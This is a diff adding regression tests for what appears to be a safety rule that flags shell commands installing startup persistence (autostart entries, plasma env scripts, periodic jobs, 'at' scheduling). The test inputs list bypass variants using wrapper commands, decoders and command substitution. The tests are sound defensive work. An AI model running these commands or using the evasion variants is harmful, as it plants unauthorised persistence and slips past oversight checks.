@@ -516,3 +516,50 @@ def test_r1_fp_fix_keeps_detection(cmd):
 ])
 def test_r1_mcp_bare_path_values_not_gated(tool, args):
     assert evaluate(_mcp(tool, **args), EMPTY).rule != RULE
+
+
+# ---- QA round 2 regressions (destination parser must fail closed) --------------
+
+@pytest.mark.parametrize("cmd", [
+    "timeout 5 cp a.desktop ~/.config/autostart/",
+    "setsid cp x.sh ~/.config/plasma-workspace/env/x.sh",
+    "nice -n 10 cp a.desktop ~/.config/autostart/",
+    "flock /tmp/l cp a ~/.config/autostart/",
+    "chrt -b 0 cp a ~/.config/autostart/",
+    "taskset -c 0 cp a ~/.config/autostart/",
+    "nice -n 5 cp s.sh /etc/periodic/daily/99s",
+    "cp -vt ~/.config/autostart/ a.desktop",
+    "install -Dt ~/.config/autostart/ a.desktop",
+    "install -vDt ~/.config/autostart/ a",
+    "mv -vt ~/.config/autostart/ a",
+    "nice at now + 1 min -f /tmp/p.sh",
+    "timeout 5 at midnight",
+    "SHELL=/bin/sh at now",
+    "DISPLAY=:0 at now",
+    "sudo -u bob at now < p",
+    "{ cp a.desktop ~/.config/autostart/; }",
+    'cp a.desktop "$XDG_CONFIG_HOME"/autostart/e.desktop',
+    'cp a.desktop "${XDG_CONFIG_HOME:-$HOME/.config}/autostart/"',
+    "gio copy a.desktop ~/.config/autostart/",
+    "echo x | sponge ~/.config/autostart/e.desktop",
+    "sort -o ~/.config/autostart/e.desktop a.desktop",
+    "openssl enc -d -a -in a.b64 -out ~/.config/autostart/e.desktop",
+    "xxd -r a.hex ~/.config/autostart/e.desktop",
+    "git clone https://example.invalid/y ~/.config/autostart",
+    "echo x>~/.xsession",
+    "cp $(echo a) ~/.config/autostart/",
+])
+def test_r2_bypasses_closed(cmd):
+    d = evaluate(_shell(cmd), EMPTY)
+    assert _hit(d), (cmd, d)
+
+
+@pytest.mark.parametrize("cmd", [
+    "timeout 5 cat ~/.config/autostart/a.desktop",
+    "nice -n 10 grep Exec ~/.config/autostart/a.desktop",
+    "sort ~/.config/autostart/a.desktop",
+    "git log -- .config/autostart",
+    "time make at",
+])
+def test_r2_no_new_false_positives(cmd):
+    assert evaluate(_shell(cmd), EMPTY).rule != RULE, cmd
